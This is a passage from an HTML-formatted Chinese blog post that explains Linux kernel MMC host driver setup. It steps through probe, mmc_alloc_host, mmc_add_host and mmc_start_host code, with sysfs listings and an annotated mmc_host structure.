    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 第1步：动态分配mmc_host结构&lt;/span&gt;
    mmc = mmc_alloc_host(&lt;span&gt;sizeof&lt;/span&gt;(&lt;span&gt;struct&lt;/span&gt; xxx_mmc_host), &amp;amp;pdev-&amp;gt;&lt;span&gt;dev);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (mmc ==&lt;span&gt; NULL) {
        pr_err(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;alloc host failed\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
        ret &lt;/span&gt;= -&lt;span&gt;ENOMEM;
        &lt;/span&gt;&lt;span&gt;goto&lt;/span&gt;&lt;span&gt; err_alloc_host;
    }

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; pointer initialization&lt;/span&gt;
    host =&lt;span&gt; mmc_priv(mmc);
    host&lt;/span&gt;-&amp;gt;mmc =&lt;span&gt; mmc;

    host&lt;/span&gt;-&amp;gt;id = pdev-&amp;gt;&lt;span&gt;id;

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Step 2: Initialize struct mmc_host &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 第2步：初始化mmc_host的结构成员&lt;/span&gt;
    mmc-&amp;gt;ops        = &amp;amp;&lt;span&gt;xxx_mmc_ops;
    mmc&lt;/span&gt;-&amp;gt;f_min      = &lt;span&gt;400000&lt;/span&gt;&lt;span&gt;;
    mmc&lt;/span&gt;-&amp;gt;f_max      = &lt;span&gt;52000000&lt;/span&gt;&lt;span&gt;;
    mmc&lt;/span&gt;-&amp;gt;ocr_avail  =&lt;span&gt; MMC_VDD_32_33;
    mmc&lt;/span&gt;-&amp;gt;caps       = MMC_CAP_8_BIT_DATA |  MMC_CAP_NONREMOVABLE |&lt;span&gt; MMC_CAP_MMC_HIGHSPEED;
    mmc&lt;/span&gt;-&amp;gt;caps2      = MMC_CAP2_BOOTPART_NOACC |&lt;span&gt; MMC_CAP_PANIC_WRITE;

    mmc&lt;/span&gt;-&amp;gt;max_segs       = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
    mmc&lt;/span&gt;-&amp;gt;max_blk_size   = &lt;span&gt;512&lt;/span&gt;&lt;span&gt;;
    mmc&lt;/span&gt;-&amp;gt;max_req_size   = &lt;span&gt;65536&lt;/span&gt;;                &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Maximum number of bytes in one req&lt;/span&gt;
    mmc-&amp;gt;max_blk_count  = mmc-&amp;gt;max_req_size/mmc-&amp;gt;max_blk_size;  &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Maximum number of blocks in one req&lt;/span&gt;
    mmc-&amp;gt;max_seg_size   = mmc-&amp;gt;max_req_size;    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Segment size in one req, in bytes&lt;/span&gt;
&lt;span&gt;
    host&lt;/span&gt;-&amp;gt;dev = &amp;amp;pdev-&amp;gt;&lt;span&gt;dev;

    platform_set_drvdata(pdev, host);       &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; pdev-&amp;gt;dev-&amp;gt;driver_data = host&lt;/span&gt;

    &lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Step 3: Register the host with driver model &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 第3步：将mmc_host注册到驱动模型中&lt;/span&gt;
&lt;span&gt;    mmc_add_host(mmc);

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;

err_alloc_host:
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; ret;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;  &lt;span class=&quot;cnblogs_code&quot;&gt;xxx_mmc_probe(pdev)&lt;/span&gt; 主要工作如下：&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;调用 &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_alloc_host()&lt;/span&gt; 分配一个 &lt;span class=&quot;cnblogs_code&quot;&gt;&lt;span&gt;struct&lt;/span&gt; mmc_host&lt;/span&gt; 结构。&lt;/li&gt;
&lt;li&gt;对 &lt;span class=&quot;cnblogs_code&quot;&gt;&lt;span&gt;struct&lt;/span&gt; mmc_host&lt;/span&gt; 结构体成员初始化。&lt;/li&gt;
&lt;li&gt;调用 &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_add_host()&lt;/span&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;将 &lt;span class=&quot;cnblogs_code&quot;&gt;&lt;span&gt;struct&lt;/span&gt; mmc_host&lt;/span&gt; &lt;/code&gt;加入到驱动模型中。&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;42-mmc_alloc_hostsizeofstruct-xxx_mmc_host-pdev-dev&quot;&gt;&lt;span&gt;4.2 mmc_alloc_host(sizeof(struct xxx_mmc_host), &amp;amp;pdev-&amp;gt;dev)&lt;/span&gt;&lt;/h2&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;13&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;46&quot;&gt;
&lt;pre&gt;
&lt;span&gt;/*&lt;/span&gt;&lt;span&gt;  drivers/mmc/core/host.c  &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;

&lt;span&gt;static&lt;/span&gt;&lt;span&gt; DEFINE_IDA(mmc_host_ida);

&lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt;  mmc_alloc_host - initialise the per-host structure. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;struct&lt;/span&gt; mmc_host *mmc_alloc_host(&lt;span&gt;int&lt;/span&gt; extra, &lt;span&gt;struct&lt;/span&gt; device *&lt;span&gt;dev)
{
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; err;
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; mmc_host *&lt;span&gt;host;

    host &lt;/span&gt;= kzalloc(&lt;span&gt;sizeof&lt;/span&gt;(&lt;span&gt;struct&lt;/span&gt; mmc_host) +&lt;span&gt; extra, GFP_KERNEL);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;host)
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; NULL;

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; scanning will be enabled when we're ready &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    host&lt;/span&gt;-&amp;gt;rescan_disable = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Allocate an unused ID&lt;/span&gt;
    err = ida_simple_get(&amp;amp;mmc_host_ida, &lt;span&gt;0&lt;/span&gt;, &lt;span&gt;0&lt;/span&gt;&lt;span&gt;, GFP_KERNEL);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (err &amp;lt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;) {
        kfree(host);
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; NULL;
    }

    host&lt;/span&gt;-&amp;gt;index =&lt;span&gt; err;

    dev_set_name(&lt;/span&gt;&amp;amp;host-&amp;gt;class_dev, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;mmc%d&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, host-&amp;gt;&lt;span&gt;index);

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 此处可以稍微注意一下，host-&amp;gt;class_dev的类class设置为mmc_host_class
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 并且host-&amp;gt;class_dev的parent指向了pdev-&amp;gt;dev (platform_device)
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 这些许的差异会改变device_add后在sysfs中表现出来的层次结构&lt;/span&gt;
    host-&amp;gt;parent = dev;                     &lt;span&gt;//&lt;/span&gt;&lt;span&gt; host-&amp;gt;parent = &amp;amp;pdev-&amp;gt;dev&lt;/span&gt;
    host-&amp;gt;class_dev.parent = dev;           &lt;span&gt;//&lt;/span&gt;&lt;span&gt; host-&amp;gt;class_dev.parent = &amp;amp;pdev-&amp;gt;dev&lt;/span&gt;
    host-&amp;gt;class_dev.&lt;span&gt;class&lt;/span&gt; = &amp;amp;&lt;span&gt;mmc_host_class; 

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Initialize host-&amp;gt;class_dev&lt;/span&gt;
    device_initialize(&amp;amp;host-&amp;gt;&lt;span&gt;class_dev);
    device_enable_async_suspend(&lt;/span&gt;&amp;amp;host-&amp;gt;&lt;span&gt;class_dev);

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (mmc_gpio_alloc(host)) {
        put_device(&lt;/span&gt;&amp;amp;host-&amp;gt;&lt;span&gt;class_dev);
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; NULL;
    }

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 初始化自旋锁&lt;/span&gt;
    spin_lock_init(&amp;amp;host-&amp;gt;&lt;span&gt;lock&lt;/span&gt;&lt;span&gt;);
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 初始化等待队列头&lt;/span&gt;
    init_waitqueue_head(&amp;amp;host-&amp;gt;&lt;span&gt;wq);
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 初始化延迟的工作队列`host-&amp;gt;detect`和`host-&amp;gt;sdio_irq_work`&lt;/span&gt;
    INIT_DELAYED_WORK(&amp;amp;host-&amp;gt;&lt;span&gt;detect, mmc_rescan);
    INIT_DELAYED_WORK(&lt;/span&gt;&amp;amp;host-&amp;gt;&lt;span&gt;sdio_irq_work, sdio_irq_work);
    timer_setup(&lt;/span&gt;&amp;amp;host-&amp;gt;retune_timer, mmc_retune_timer, &lt;span&gt;0&lt;/span&gt;&lt;span&gt;);

    host&lt;/span&gt;-&amp;gt;max_segs = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
    host&lt;/span&gt;-&amp;gt;max_seg_size =&lt;span&gt; PAGE_SIZE;

    host&lt;/span&gt;-&amp;gt;max_req_size =&lt;span&gt; PAGE_SIZE;
    host&lt;/span&gt;-&amp;gt;max_blk_size = &lt;span&gt;512&lt;/span&gt;&lt;span&gt;;
    host&lt;/span&gt;-&amp;gt;max_blk_count = PAGE_SIZE / &lt;span&gt;512&lt;/span&gt;&lt;span&gt;;

    host&lt;/span&gt;-&amp;gt;fixed_drv_type = -&lt;span&gt;EINVAL;
    host&lt;/span&gt;-&amp;gt;ios.power_delay_ms = &lt;span&gt;10&lt;/span&gt;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; host;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;主要工作如下：&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;动态分配内存给 &lt;span class=&quot;cnblogs_code&quot;&gt;&lt;span&gt;struct&lt;/span&gt; mmc_host&lt;/span&gt; 结构体，并对结构体成员初始化。&lt;/li&gt;
&lt;li&gt;调用 &lt;span class=&quot;cnblogs_code&quot;&gt;device_initialize()&lt;/span&gt; 对 &lt;span class=&quot;cnblogs_code&quot;&gt;host-&amp;gt;class_dev&lt;/span&gt; 进行初始化，包括 &lt;span class=&quot;cnblogs_code&quot;&gt;kobject&lt;/span&gt; 、 &lt;span class=&quot;cnblogs_code&quot;&gt;mutex&lt;/span&gt; 等。&lt;/li&gt;
&lt;li&gt;初始化自旋锁、等待队列 (&lt;span&gt;waitqueue&lt;/span&gt;)和延迟的工作队列 (&lt;span&gt;Delayed Work&lt;/span&gt;)，其中，用处理函数 &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_rescan()&lt;/span&gt; 来初始化延迟的工作队列 &lt;span class=&quot;cnblogs_code&quot;&gt;host-&amp;gt;detect&lt;/span&gt; ，后文会再次提到。&lt;/li&gt;
&lt;li&gt;初始化定时器 &lt;span class=&quot;cnblogs_code&quot;&gt;host-&amp;gt;retune_timer&lt;/span&gt; ，处理函数为 &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_retune_timer()&lt;/span&gt; 。&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;43-mmc_add_hostmmc&quot;&gt;&lt;span&gt;4.3 mmc_add_host(mmc)&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;在上述对host进行初始化后，调用 &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_add_host()&lt;/span&gt; 将host注册到驱动模型中。&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;31&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;10&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;/*&lt;/span&gt;&lt;span&gt;  drivers/mmc/core/host.c  &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;

&lt;span&gt;/*&lt;/span&gt;&lt;span&gt;  mmc_add_host - initialise host hardware  &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;int&lt;/span&gt; mmc_add_host(&lt;span&gt;struct&lt;/span&gt; mmc_host *&lt;span&gt;host)
{
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; err;

    WARN_ON((host&lt;/span&gt;-&amp;gt;caps &amp;amp; MMC_CAP_SDIO_IRQ) &amp;amp;&amp;amp;
            !host-&amp;gt;ops-&amp;gt;&lt;span&gt;enable_sdio_irq);

    err &lt;/span&gt;= device_add(&amp;amp;host-&amp;gt;&lt;span&gt;class_dev);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (err)
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; err;

    led_trigger_register_simple(dev_name(&lt;/span&gt;&amp;amp;host-&amp;gt;class_dev), &amp;amp;host-&amp;gt;&lt;span&gt;led);

#ifdef CONFIG_DEBUG_FS
    mmc_add_host_debugfs(host);
&lt;/span&gt;&lt;span&gt;#endif&lt;/span&gt;&lt;span&gt;

    mmc_start_host(host);
    mmc_register_pm_notifier(host);

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;主要的工作包括两个部分：&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt; &lt;span class=&quot;cnblogs_code&quot;&gt;device_add()&lt;/span&gt; 将 &lt;span class=&quot;cnblogs_code&quot;&gt;host-&amp;gt;class_dev&lt;/span&gt; 加入到sysfs中device层次结构中。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;调用 &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_start_host()&lt;/span&gt; 启动主设备，也即MMC设备开始正常工作。&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;span&gt;在介绍 &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_start_host()&lt;/span&gt; 之前，先简单介绍下此处将 &lt;span class=&quot;cnblogs_code&quot;&gt;host-&amp;gt;class_dev&lt;/span&gt; 加入到驱动模型后sysfs中表现出来的层次结构。 4.2一节中介绍 &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_alloc_host()&lt;/span&gt; 时注意到 &lt;span class=&quot;cnblogs_code&quot;&gt;host-&amp;gt;class_dev&lt;/span&gt; 的 &lt;span class=&quot;cnblogs_code&quot;&gt;&lt;span&gt;class&lt;/span&gt;&lt;/span&gt; 被设置为 &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_host_class&lt;/span&gt; ， &lt;span class=&quot;cnblogs_code&quot;&gt;parent&lt;/span&gt; 指向 &lt;span class=&quot;cnblogs_code&quot;&gt;pdev-&amp;gt;dev&lt;/span&gt; 。 &lt;span class=&quot;cnblogs_code&quot;&gt;device_add()--&amp;gt;get_device_parent()/device_add_class_symlinks()&lt;/span&gt; 调用过程中将在 &lt;span class=&quot;cnblogs_code&quot;&gt;platform_device&lt;/span&gt; 的目录下多建立一个名称和 &lt;span class=&quot;cnblogs_code&quot;&gt;&lt;span&gt;class&lt;/span&gt; name&lt;/span&gt; 相同的子文件夹，同时在class类目录下也会有指向实际设备的目录项。sysfs此时的结构如下：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;31.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;10.5&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
/sys/devices/platform/xxx_mmc.&lt;span&gt;0&lt;/span&gt;/mmc_host/&lt;span&gt;mmc0$ ll
total &lt;/span&gt;&lt;span&gt;0&lt;/span&gt;&lt;span&gt;
... ...  root root    &lt;/span&gt;&lt;span&gt;0&lt;/span&gt; Sep &lt;span&gt;17&lt;/span&gt; &lt;span&gt;11&lt;/span&gt;:&lt;span&gt;21&lt;/span&gt; ./&lt;span&gt;
... ...  root root    &lt;/span&gt;&lt;span&gt;0&lt;/span&gt; Sep &lt;span&gt;17&lt;/span&gt; &lt;span&gt;11&lt;/span&gt;:&lt;span&gt;21&lt;/span&gt; ../&lt;span&gt;
... ...  root root    &lt;/span&gt;&lt;span&gt;0&lt;/span&gt; Sep &lt;span&gt;17&lt;/span&gt; &lt;span&gt;11&lt;/span&gt;:&lt;span&gt;23&lt;/span&gt; device -&amp;gt; ../../../xxx_mmc.&lt;span&gt;0&lt;/span&gt;/&lt;span&gt;
... ...  root root    &lt;/span&gt;&lt;span&gt;0&lt;/span&gt; Sep &lt;span&gt;17&lt;/span&gt; &lt;span&gt;11&lt;/span&gt;:&lt;span&gt;23&lt;/span&gt; power/&lt;span&gt;
... ...  root root    &lt;/span&gt;&lt;span&gt;0&lt;/span&gt; Sep &lt;span&gt;17&lt;/span&gt; &lt;span&gt;11&lt;/span&gt;:&lt;span&gt;23&lt;/span&gt; subsystem -&amp;gt; ../../../../../&lt;span&gt;class&lt;/span&gt;/mmc_host/&lt;span&gt;
... ...  root root &lt;/span&gt;&lt;span&gt;4096&lt;/span&gt; Sep &lt;span&gt;17&lt;/span&gt; &lt;span&gt;11&lt;/span&gt;:&lt;span&gt;23&lt;/span&gt;&lt;span&gt; uevent

&lt;/span&gt;/sys/&lt;span&gt;class&lt;/span&gt;/mmc_host$ ll        /sys/&lt;span&gt;class&lt;/span&gt;/&lt;span&gt;mmc_host
total &lt;/span&gt;&lt;span&gt;0&lt;/span&gt;&lt;span&gt;
... ...  root root &lt;/span&gt;&lt;span&gt;0&lt;/span&gt; Sep &lt;span&gt;17&lt;/span&gt; &lt;span&gt;11&lt;/span&gt;:&lt;span&gt;21&lt;/span&gt; ./&lt;span&gt;
... ...  root root &lt;/span&gt;&lt;span&gt;0&lt;/span&gt; Sep &lt;span&gt;17&lt;/span&gt; &lt;span&gt;11&lt;/span&gt;:&lt;span&gt;09&lt;/span&gt; ../&lt;span&gt;
... ...  root root &lt;/span&gt;&lt;span&gt;0&lt;/span&gt; Sep &lt;span&gt;17&lt;/span&gt; &lt;span&gt;11&lt;/span&gt;:&lt;span&gt;26&lt;/span&gt; mmc0 -&amp;gt; ../../devices/platform/xxx_mmc.&lt;span&gt;0&lt;/span&gt;/mmc_host/mmc0/
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;此时 &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_host&lt;/span&gt; 结构体成员初始化状态简要列举如下（详细可以按照驱动模型中&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;device&lt;/code&gt;注册步骤推导）：&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;
&lt;div class=&quot;highlight&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37.5&quot;&gt;&lt;img src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; id=&quot;code_img_closed_a0b40ea9-8a81-4094-b788-dfe5023babc4&quot; class=&quot;code_img_closed&quot;/&gt;&lt;img src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; id=&quot;code_img_opened_a0b40ea9-8a81-4094-b788-dfe5023babc4&quot; class=&quot;code_img_opened&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_a0b40ea9-8a81-4094-b788-dfe5023babc4&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;70&quot;&gt;
&lt;pre&gt;
&lt;span&gt;struct&lt;/span&gt;&lt;span&gt; mmc_host mmc {
    .rescan_disable    &lt;/span&gt;= &lt;span&gt;1&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt; set to 0 in mmc_start_host()&lt;/span&gt;
&lt;span&gt;
    .index         &lt;/span&gt;=&lt;span&gt; id (allocated)
    .class_dev (&lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; dev)=&lt;span&gt; {
        .p &lt;/span&gt;=&lt;span&gt; {
            .device &lt;/span&gt;= &amp;amp;&lt;span&gt;mmc.class_dev
                .klist_children &lt;/span&gt;=&lt;span&gt; 
                .deferred_probe &lt;/span&gt;=&lt;span&gt; 
        }
        . kobj &lt;/span&gt;=&lt;span&gt; {
            .name &lt;/span&gt;= (“mmc%d”, .index)       &lt;span&gt;//&lt;/span&gt;&lt;span&gt; name = “mmc0”&lt;/span&gt;
            .kset =&lt;span&gt; devices_kset        
            .ktype &lt;/span&gt;= &amp;amp;&lt;span&gt;device_ktype
            INIT_LIST_HEAD(.dma_pools);
            mutex_init(.mutex);
            spin_lock_init(.devres_lock);
            INIT_LIST_HEAD(.devres_head);

            .parent &lt;/span&gt;= dir-&amp;gt;&lt;span&gt;kobject;  
                &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt;  /sys/devices/platform/xxx_mmc.0/mmc_host/mmc0  &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
                &lt;span&gt;//&lt;/span&gt;&lt;span&gt;struct class_dir dir = {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;    .class = &amp;amp;mmc_host_class
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;        .kobj = {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;            .ktype = &amp;amp;class_dir_ktype
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;                .kset = &amp;amp; mmc_host_class-&amp;gt;p-&amp;gt;glue_dirs
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;                .parent = &amp;amp;pdev-&amp;gt;dev-&amp;gt;kobj      
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;                /*  /sys/devices/platform/xxx_mmc.0/   */

                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;                .name = “mmc_host”
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;        }
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;}&lt;/span&gt;
&lt;span&gt;
        }
        .parent &lt;/span&gt;= &amp;amp;pdev-&amp;gt;&lt;span&gt;dev
            .&lt;/span&gt;&lt;span&gt;class&lt;/span&gt; = &amp;amp;mmc_host_class =&lt;span&gt; {
                .name       &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;mmc_host&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
                .dev_release    &lt;/span&gt;=&lt;span&gt; mmc_host_classdev_release,
                .dev_kobj &lt;/span&gt;=&lt;span&gt; sysfs_dev_char_kobj
                    .p (&lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; subsys_private) =&lt;span&gt; {
                        .&lt;/span&gt;&lt;span&gt;class&lt;/span&gt; = &amp;amp;&lt;span&gt;mmc_host_class
                            . glue_dirs (kset) &lt;/span&gt;=&lt;span&gt; {
                                .kobj &lt;/span&gt;=&lt;span&gt; 
                                    .list &lt;/span&gt;=&lt;span&gt; 
                                    .list_lock &lt;/span&gt;=&lt;span&gt; 
                            }
                        . subsys (&lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; kset) =&lt;span&gt; {
                            .kobj &lt;/span&gt;=&lt;span&gt; {
                                .name &lt;/span&gt;=&lt;span&gt; “mmc_host”
                                    .parent &lt;/span&gt;= &amp;amp; class_kset-&amp;gt;&lt;span&gt;kobj
                                    .kset  &lt;/span&gt;=&lt;span&gt; class_kset;
                                .ktype &lt;/span&gt;= &amp;amp;&lt;span&gt;class_ktype;

                                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; create_dir(kobj)&lt;/span&gt;
&lt;span&gt;                            }
                        }
                    }
            };
    }
    .parent &lt;/span&gt;= &amp;amp;pdev-&amp;gt;&lt;span&gt;dev

    spin_lock_init(&lt;/span&gt;&amp;amp;.&lt;span&gt;lock&lt;/span&gt;&lt;span&gt;);
    init_waitqueue_head(&lt;/span&gt;&amp;amp;&lt;span&gt;.wq);
    INIT_DELAYED_WORK(&lt;/span&gt;&amp;amp;&lt;span&gt;.detect, mmc_rescan);
    INIT_DELAYED_WORK(&lt;/span&gt;&amp;amp;&lt;span&gt;.sdio_irq_work, sdio_irq_work);
    timer_setup(&lt;/span&gt;&amp;amp;.retune_timer, mmc_retune_timer, &lt;span&gt;0&lt;/span&gt;&lt;span&gt;);

    .max_segs         &lt;/span&gt;= &lt;span&gt;1&lt;/span&gt;&lt;span&gt;
        .max_seg_size  &lt;/span&gt;= PAGE_SIZE     &lt;span&gt;//&lt;/span&gt;&lt;span&gt;max segment size 8K&lt;/span&gt;
        .max_req_size  =&lt;span&gt; PAGE_SIZE
        .max_blk_size  &lt;/span&gt;= &lt;span&gt;512&lt;/span&gt;&lt;span&gt;
        .max_blk_count     &lt;/span&gt;= PAGE_SIZE / &lt;span&gt;512&lt;/span&gt;&lt;span&gt;
        .fixed_drv_type    &lt;/span&gt;= -&lt;span&gt;EINVAL
        .ios &lt;/span&gt;=&lt;span&gt; {
            .power_delay_ms &lt;/span&gt;= &lt;span&gt;10&lt;/span&gt;&lt;span&gt;
            .power_mode &lt;/span&gt;= MMC_POWER_UP      &lt;span&gt;//&lt;/span&gt;&lt;span&gt; mmc_start_host()&lt;/span&gt;
            .vdd = fls(ocr) – &lt;span&gt;1&lt;/span&gt;             &lt;span&gt;//&lt;/span&gt;&lt;span&gt; mmc_power_up(host, host-&amp;gt;ocr_avail);&lt;/span&gt;
            .clock =&lt;span&gt; .f_init

        }
    . ops &lt;/span&gt;=&lt;span&gt; {
        .request    &lt;/span&gt;=&lt;span&gt; xxx_mmc_request,
        .set_ios    &lt;/span&gt;=&lt;span&gt; xxx_mmc_set_ios,
    }
    .f_min         &lt;/span&gt;= &lt;span&gt;400000&lt;/span&gt;&lt;span&gt;
    .f_max         &lt;/span&gt;= &lt;span&gt;52000000&lt;/span&gt;&lt;span&gt;
    .ocr_avail     &lt;/span&gt;= MMC_VDD_32_33 = &lt;span&gt;0x00100000&lt;/span&gt;&lt;span&gt;
    .caps  &lt;/span&gt;= MMC_CAP_8_BIT_DATA |  MMC_CAP_NONREMOVABLE |&lt;span&gt; MMC_CAP_MMC_HIGHSPEED;
    .caps2 &lt;/span&gt;= MMC_CAP2_BOOTPART_NOACC |&lt;span&gt; MMC_CAP_PANIC_WRITE;
    .pm_notify.notifier_call &lt;/span&gt;=&lt;span&gt; mmc_pm_notify
};&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;h2 id=&quot;44-mmc_add_hostmmc&quot;&gt;&lt;span&gt;4.4 mmc_add_host(mmc)&lt;/span&gt;&lt;/h2&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;9.5&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;/*&lt;/span&gt;&lt;span&gt;  drivers/mmc/core/core.c  &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;

&lt;span&gt;void&lt;/span&gt; mmc_start_host(&lt;span&gt;struct&lt;/span&gt; mmc_host *&lt;span&gt;host)
{
    host&lt;/span&gt;-&amp;gt;f_init = max(freqs[&lt;span&gt;0&lt;/span&gt;], host-&amp;gt;&lt;span&gt;f_min);
    host&lt;/span&gt;-&amp;gt;rescan_disable = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
    host&lt;/span&gt;-&amp;gt;ios.power_mode =&lt;span&gt; MMC_POWER_UNDEFINED;

